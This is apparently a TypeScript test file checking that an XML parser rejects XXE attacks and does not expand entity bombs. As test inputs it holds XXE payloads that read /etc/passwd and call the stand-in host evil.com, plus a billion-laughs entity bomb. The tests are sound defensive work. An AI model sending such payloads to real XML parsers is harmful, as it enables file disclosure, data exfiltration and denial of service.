/**
 * xxePrevention.test.ts — XXE (XML External Entity) prevention tests
 *
 * §4.3: Proves that the XML parser used in sourceFetcher has external entity
 * processing disabled, preventing XXE attacks via malicious XML responses.
 *
 * Tests the exported xmlParser instance directly since it's a stateless parser.
 */

import { describe, it, expect } from "vitest";
import { xmlParser } from "../src/data/sourceFetcher";

// ── §4.3 XXE prevention ───────────────────────────────────────

describe("XXE prevention — external entity injection", () => {
  it("rejects external SYSTEM entities with an error", () => {
    const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>`;

    // fast-xml-parser v5 actively rejects external entities — even safer
    // than silent ignoring. The entity is never resolved.
    expect(() => xmlParser.parse(maliciousXml)).toThrow("External entities");
  });

  it("rejects SYSTEM entities targeting network resources", () => {
    const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal">
]>
<root>
  <secret>&xxe;</secret>
</root>`;

    // fast-xml-parser v5 throws on external entities — no network request made
    expect(() => xmlParser.parse(maliciousXml)).toThrow("External entities");
  });

  it("handles billion laughs attack without memory explosion", () => {
    // Classic XML bomb — nested entity expansion
    const billionLaughs = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`;

    // Should complete quickly without OOM — entities are not expanded
    const t0 = Date.now();
    const result = xmlParser.parse(billionLaughs);
    const elapsed = Date.now() - t0;

    // Should complete in under 1 second (no exponential expansion)
    expect(elapsed).toBeLessThan(1000);

    // Verify the root content is not a gigantic expanded string
    const rootContent = result?.root;
    if (typeof rootContent === "string") {
      expect(rootContent.length).toBeLessThan(10_000);
    }
  });
});

describe("XXE prevention — safe XML parsing", () => {
  it("parses valid XML correctly", () => {
    const xml = `<?xml version="1.0"?>
<root>
  <name>ZerryBit</name>
  <version>2.4</version>
  <items>
    <item id="1">Widget A</item>
    <item id="2">Widget B</item>
  </items>
</root>`;

    const result = xmlParser.parse(xml);
    expect(result.root.name).toBe("ZerryBit");
    expect(result.root.version).toBe(2.4);
  });

  it("preserves attributes with @ prefix", () => {
    const xml = `<root><item id="42" enabled="true">content</item></root>`;
    const result = xmlParser.parse(xml);
    expect(result.root.item["@_id"]).toBe(42);
    expect(result.root.item["#text"]).toBe("content");
  });

  it("handles CDATA sections safely", () => {
    const xml = `<root><data><![CDATA[Some <special> & "stuff"]]></data></root>`;
    const result = xmlParser.parse(xml);
    expect(result.root.data).toContain("Some <special>");
  });
});
